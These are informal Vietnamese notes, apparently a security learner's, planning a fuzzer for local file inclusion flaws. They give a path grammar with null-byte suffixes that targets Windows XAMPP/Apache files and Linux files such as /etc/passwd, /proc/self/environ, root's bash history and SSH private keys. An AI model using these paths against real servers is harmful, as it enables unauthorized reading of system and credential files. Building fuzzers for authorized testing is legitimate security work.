LFI thì làm gì bây giờ nhỉ


với lỗi này thì
xác định request và tham số rồi gửi tới nó đưòng dẫn file mà mình mong muốn


Đầu tiên thì cần xây dựng fuzzer: chịu trách nhiệm tạo ra các đường dẫn file một cách hợp lệ

Chia ra làm 2 loại đường dẫn: Windown và Linux

tham khảo trên payload of the thing nào


phải kết hợp thêm null byte ở cuối nữa mới ổn áp!!!! 

---- for windows

<disk><directory>%00

<disk> : <"C:\", "D:\">

<directory> : ["<xampp>",  "<apache>"]

<xampp> : [ "xampp\<pathxampp>\<filexampp>" ]

<apache> : [ "apache\<pathapache>\<filexampp>" ]

<pathxampp> : [ "phpMyAdmin", "apache", "FileZillaFTP", "MercuryMail", "tomcat", "php", "sendmail" , "mysql", "logs"]

<pathapache> : ["logs"]

<filexampp> : ["config.inc", "phpinfo.php", "config.inc.php", "error.log","access.log"]

<fileapache> : ["error.log", "access.log"]



---- for linux

/<folder>

<folder> : ["etc/<directoryEtc>", "opt/<directoryOpt>", "proc/<directoryProc>", "root/<directoryRoot>", "<directoryUsr>", "var/<directoryVar><endVar>"]


<directoryEtc> : ["passwd" , "group" , "hosts", "motd" , "issue", "bashrc", "apache2/<fileApache2>" , "httpd/logs/<fileHttpd>"]

<fileApache2> : ["apache2.conf", "ports.conf" , "sites-available/default"]

<fileHttpd> : ["access.log", "error.log"]

<directoryOpt> : ["lampp/logs/<fileHttpd>"]

<directoryProc> : ["version", "cmdline", "mounts", "config.gz", "self/environ"]

<directoryRoot> : [".bashrc" , ".bash_history" , ".ssh/<sshFile>"]

<sshFile>: ["authorized_keys", "id_rsa", "id_rsa.keystore", "id_rsa.pub" , "known_hosts"]

<directoryUsr> :    ["/usr/local/<apapche>/htdocs/index.html",
                     "/usr/local/<apache>/htdocs/index.html",
                     "/usr/local/<apache>/conf/extra/httpd-ssl.conf",
                     "/usr/local/<apache>/logs/error_log",
                     "/usr/local/<apache>/logs/access_log",
                     "/usr/local/<apache>/bin/apachectl"]
<apache> : ["apache", "apache2"]

<directoryVar> : ["apache/logs", "log/apache", "log/httpd", "log/nginx"]

<endVar> : ["access_log", "access.log" , "error_log", "error.log"]